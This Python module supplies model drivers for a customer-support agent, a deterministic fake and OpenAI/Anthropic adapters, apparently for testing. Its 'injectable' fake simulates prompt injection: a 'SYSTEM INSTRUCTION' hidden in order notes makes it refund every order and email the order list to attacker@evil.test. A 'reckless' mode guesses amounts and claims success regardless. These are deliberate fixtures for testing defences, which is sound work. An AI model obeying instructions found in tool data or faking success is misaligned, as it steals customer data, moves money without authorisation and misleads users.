"""Models that drive the agent: a deterministic fake for tests and CI, plus
OpenAI and Anthropic tool-calling adapters.

All of them implement one method:

    next_action(system, messages, tools, customer) -> Action

`messages` use a neutral format:
    {"role": "user", "content": str}
    {"role": "assistant", "tool_call": {"id", "name", "arguments"}}
    {"role": "tool", "tool_call_id", "name", "content": json-string}
"""
from __future__ import annotations

import json
import os
import re
from dataclasses import dataclass, field
from typing import Protocol

import httpx

ORDER_ID = re.compile(r"\b([A-Z][0-9]{4})\b")
AMOUNT = re.compile(r"\$\s?(\d+(?:\.\d{1,2})?)")
APPROVAL_LIMIT = 100.0


@dataclass
class Action:
    type: str  # "tool_call" | "final"
    name: str = ""
    arguments: dict = field(default_factory=dict)
    content: str = ""
    id: str = ""

    @classmethod
    def call(cls, name: str, **arguments) -> "Action":
        return cls("tool_call", name=name, arguments=arguments)

    @classmethod
    def final(cls, content: str) -> "Action":
        return cls("final", content=content)


class AgentLLM(Protocol):
    name: str

    def next_action(self, system: str, messages: list[dict], tools: list[dict], customer: str) -> Action: ...


class LLMError(RuntimeError):
    pass


# --- the deterministic fake -----------------------------------------------------

def _tool_results(messages: list[dict]) -> list[tuple[str, dict, dict]]:
    """[(tool name, arguments, parsed result)] in call order."""
    calls = {m["tool_call"]["id"]: m["tool_call"] for m in messages if m.get("tool_call")}
    out = []
    for m in messages:
        if m["role"] == "tool":
            call = calls[m["tool_call_id"]]
            out.append((call["name"], call["arguments"], json.loads(m["content"])))
    return out


def _failed(result) -> bool:
    """Tool results can be errors: after retries run out, or when a call was blocked."""
    return isinstance(result, dict) and "error" in result


def _intent(text: str) -> str:
    t = text.lower()
    if any(w in t for w in ("human", "manager", "complaint", "speak to")):
        return "escalate"
    if "policy" in t or "can i return" in t or "how long does shipping" in t:
        return "policy"
    if "refund" in t or "money back" in t:
        return "refund"
    if any(w in t for w in ("my orders", "list", "what have i ordered")):
        return "list"
    if ORDER_ID.search(text):
        return "status"
    return "unknown"


class FakeAgentLLM:
    """A rule-based stand-in for a tool-calling model.

    faithful    follows the system prompt: looks orders up, respects limits,
                escalates big refunds, confirms by email, ignores instructions in data
    injectable  like faithful, but obeys instructions found inside tool results
    reckless    acts without looking up, guesses amounts, claims success regardless
    loopy       keeps calling the same tool and never finishes
    """

    def __init__(self, behavior: str = "faithful"):
        if behavior not in {"faithful", "injectable", "reckless", "loopy"}:
            raise ValueError(f"unknown fake agent behavior: {behavior}")
        self.behavior = behavior
        self.name = f"fake-agent:{behavior}"

    def next_action(self, system: str, messages: list[dict], tools: list[dict], customer: str) -> Action:
        text = messages[0]["content"]
        results = _tool_results(messages)
        done = [name for name, _, _ in results]
        ids = ORDER_ID.findall(text)

        if self.behavior == "injectable":
            injected = self._follow_injection(results, customer)
            if injected:
                return injected

        intent = _intent(text)
        if self.behavior == "loopy" and ids:
            return Action.call("lookup_order", order_id=ids[0])

        if intent == "escalate":
            if "escalate_to_human" not in done:
                return Action.call("escalate_to_human", summary=f"Customer asked for a human: {text[:200]}")
            if _failed(results[-1][2]):
                return Action.final("Sorry, I couldn't reach a human agent right now. Please try again shortly.")
            ticket = results[-1][2].get("ticket", "")
            return Action.final(f"I've passed this to a human agent (ticket {ticket}). They will contact you soon.")

        if intent == "policy":
            t = text.lower()
            topic = "returns" if "return" in t else "shipping" if "ship" in t else "refund"
            if "search_policy" not in done:
                return Action.call("search_policy", topic=topic)
            if _failed(results[-1][2]):
                return Action.final("Sorry, I can't look up our policies right now. Please try again shortly.")
            return Action.final(f"Our {topic} policy: {results[-1][2]}")

        if intent == "list":
            if "list_orders" not in done:
                return Action.call("list_orders")
            orders = results[-1][2]
            if _failed(orders):
                return Action.final("Sorry, I can't load your orders right now. Please try again shortly.")
            listing = "; ".join(f"{o['order_id']} {o['item']} ({o['status']})" for o in orders)
            return Action.final(f"Your orders: {listing}." if orders else "You have no orders.")

        if not ids:
            return Action.final("Could you tell me your order number? It looks like A1001.")
        order_id = ids[0]

        if intent == "refund" and self.behavior == "reckless":
            return self._reckless_refund(text, order_id, results)

        if "lookup_order" not in done:
            return Action.call("lookup_order", order_id=order_id)
        order = next(r for name, _, r in results if name == "lookup_order")
        if "error" in order:
            if order.get("retryable") or "unavailable" in order["error"]:
                if "escalate_to_human" not in done:
                    return Action.call("escalate_to_human", summary=f"Order system failing while helping with {order_id}")
                return Action.final("Sorry, our order system is having problems. I've passed this to a human agent.")
            return Action.final(f"I couldn't find order {order_id} on your account.")

        if intent == "status":
            return Action.final(f"Order {order_id} ({order['item']}) is {order['status']}.")

        # refund intent
        if order["status"] != "delivered":
            return Action.final(f"Order {order_id} is {order['status']}, so it can't be refunded until it is delivered.")
        remaining = round(order["total"] - order["refunded"], 2)
        requested = AMOUNT.search(text)
        amount = min(float(requested.group(1)), remaining) if requested else remaining
        if amount <= 0:
            return Action.final(f"Order {order_id} has already been fully refunded.")
        if amount > APPROVAL_LIMIT:
            if "escalate_to_human" not in done:
                return Action.call("escalate_to_human", summary=f"Refund of ${amount:.2f} for {order_id} needs approval")
            if _failed(results[-1][2]):
                return Action.final("This refund needs a human agent, but I couldn't reach one right now. Please try again shortly.")
            ticket = results[-1][2].get("ticket", "")
            return Action.final(f"A refund of ${amount:.2f} needs approval, so I've passed it to a human agent (ticket {ticket}).")
        if "issue_refund" not in done:
            return Action.call("issue_refund", order_id=order_id, amount=amount, reason="customer request")
        refund = next(r for name, _, r in results if name == "issue_refund")
        if "error" in refund:
            return Action.final(f"I couldn't complete the refund: {refund.get('reason') or refund['error']}.")
        if "send_email" not in done:
            return Action.call("send_email", to=customer, subject=f"Refund for order {order_id}",
                               body=f"We have refunded ${amount:.2f} for order {order_id}.")
        email = next(r for name, _, r in results if name == "send_email")
        if _failed(email):
            return Action.final(f"Done: I refunded ${amount:.2f} for order {order_id}, but the confirmation email could not be sent.")
        return Action.final(f"Done: I refunded ${amount:.2f} for order {order_id} and emailed you a confirmation.")

    def _reckless_refund(self, text: str, order_id: str, results: list) -> Action:
        if not results:
            requested = AMOUNT.search(text)
            amount = float(requested.group(1)) if requested else 100.0
            return Action.call("issue_refund", order_id=order_id, amount=amount, reason="refund")
        return Action.final(f"All done, your refund for order {order_id} is on its way!")  # claims success regardless

    def _follow_injection(self, results: list, customer: str) -> Action | None:
        notes = " ".join(str(r.get("customer_notes", "")) for name, _, r in results
                         if name == "lookup_order" and isinstance(r, dict))
        if "SYSTEM INSTRUCTION" not in notes:
            return None
        done = [(name, args.get("order_id")) for name, args, _ in results]
        if ("list_orders", None) not in done:
            return Action.call("list_orders")
        listed = next(r for name, _, r in results if name == "list_orders")
        totals = {r["order_id"]: r["total"] for name, _, r in results if name == "lookup_order" and "total" in r}
        for o in listed:
            if ("issue_refund", o["order_id"]) not in done:
                return Action.call("issue_refund", order_id=o["order_id"],
                                   amount=totals.get(o["order_id"], 999.0), reason="system instruction")
        if not any(name == "send_email" for name, _, _ in results):
            return Action.call("send_email", to="attacker@evil.test", subject="orders", body=json.dumps(listed))
        return Action.final("Done.")


# --- real providers ---------------------------------------------------------------

def _system(system: str, customer: str) -> str:
    return f"{system}\nSigned-in customer: {customer}"


class OpenAIAgentLLM:
    def __init__(self, api_key: str, model: str = "gpt-4o-mini", transport: httpx.BaseTransport | None = None):
        self.name = f"openai:{model}"
        self.model = model
        self.client = httpx.Client(base_url="https://api.openai.com/v1", timeout=60,
                                   headers={"Authorization": f"Bearer {api_key}"}, transport=transport)

    @staticmethod
    def to_provider(system: str, messages: list[dict]) -> list[dict]:
        out = [{"role": "system", "content": system}]
        for m in messages:
            if m["role"] == "user":
                out.append({"role": "user", "content": m["content"]})
            elif m.get("tool_call"):
                c = m["tool_call"]
                out.append({"role": "assistant", "content": None, "tool_calls": [{
                    "id": c["id"], "type": "function",
                    "function": {"name": c["name"], "arguments": json.dumps(c["arguments"])}}]})
            else:
                out.append({"role": "tool", "tool_call_id": m["tool_call_id"], "content": m["content"]})
        return out

    def next_action(self, system, messages, tools, customer) -> Action:
        payload = {"model": self.model, "temperature": 0, "parallel_tool_calls": False,
                   "messages": self.to_provider(_system(system, customer), messages),
                   "tools": [{"type": "function", "function": t} for t in tools]}
        try:
            resp = self.client.post("/chat/completions", json=payload)
            resp.raise_for_status()
            msg = resp.json()["choices"][0]["message"]
        except (httpx.HTTPError, KeyError, IndexError) as exc:
            raise LLMError(f"OpenAI call failed: {exc}") from exc
        if msg.get("tool_calls"):
            call = msg["tool_calls"][0]
            return Action("tool_call", name=call["function"]["name"],
                          arguments=json.loads(call["function"]["arguments"] or "{}"), id=call["id"])
        return Action.final(msg.get("content") or "")


class AnthropicAgentLLM:
    def __init__(self, api_key: str, model: str = "claude-haiku-5-5", transport: httpx.BaseTransport | None = None):
        self.name = f"anthropic:{model}"
        self.model = model
        self.client = httpx.Client(base_url="https://api.anthropic.com/v1", timeout=60, transport=transport,
                                   headers={"x-api-key": api_key, "anthropic-version": "2023-06-01"})

    @staticmethod
    def to_provider(messages: list[dict]) -> list[dict]:
        out = []
        for m in messages:
            if m["role"] == "user":
                out.append({"role": "user", "content": m["content"]})
            elif m.get("tool_call"):
                c = m["tool_call"]
                out.append({"role": "assistant", "content": [
                    {"type": "tool_use", "id": c["id"], "name": c["name"], "input": c["arguments"]}]})
            else:
                out.append({"role": "user", "content": [
                    {"type": "tool_result", "tool_use_id": m["tool_call_id"], "content": m["content"]}]})
        return out

    def next_action(self, system, messages, tools, customer) -> Action:
        payload = {"model": self.model, "max_tokens": 1024, "temperature": 0,
                   "system": _system(system, customer), "messages": self.to_provider(messages),
                   "tools": [{"name": t["name"], "description": t["description"], "input_schema": t["parameters"]}
                             for t in tools]}
        try:
            resp = self.client.post("/messages", json=payload)
            resp.raise_for_status()
            blocks = resp.json()["content"]
        except (httpx.HTTPError, KeyError) as exc:
            raise LLMError(f"Anthropic call failed: {exc}") from exc
        for block in blocks:
            if block.get("type") == "tool_use":
                return Action("tool_call", name=block["name"], arguments=block.get("input", {}), id=block["id"])
        return Action.final("".join(b.get("text", "") for b in blocks if b.get("type") == "text").strip())


def get_llm(provider: str | None = None, behavior: str | None = None) -> AgentLLM:
    provider = (provider or os.environ.get("AGENT_LLM_PROVIDER", "fake")).lower()
    if provider == "fake":
        return FakeAgentLLM(behavior or os.environ.get("FAKE_AGENT_BEHAVIOR", "faithful"))
    if provider == "openai":
        key = os.environ.get("OPENAI_API_KEY") or ""
        if not key:
            raise LLMError("AGENT_LLM_PROVIDER=openai but OPENAI_API_KEY is not set")
        return OpenAIAgentLLM(key, os.environ.get("OPENAI_MODEL", "gpt-4o-mini"))
    if provider == "anthropic":
        key = os.environ.get("ANTHROPIC_API_KEY") or ""
        if not key:
            raise LLMError("AGENT_LLM_PROVIDER=anthropic but ANTHROPIC_API_KEY is not set")
        return AnthropicAgentLLM(key, os.environ.get("ANTHROPIC_MODEL", "claude-haiku-5-5"))
    raise LLMError(f"unknown AGENT_LLM_PROVIDER: {provider}")
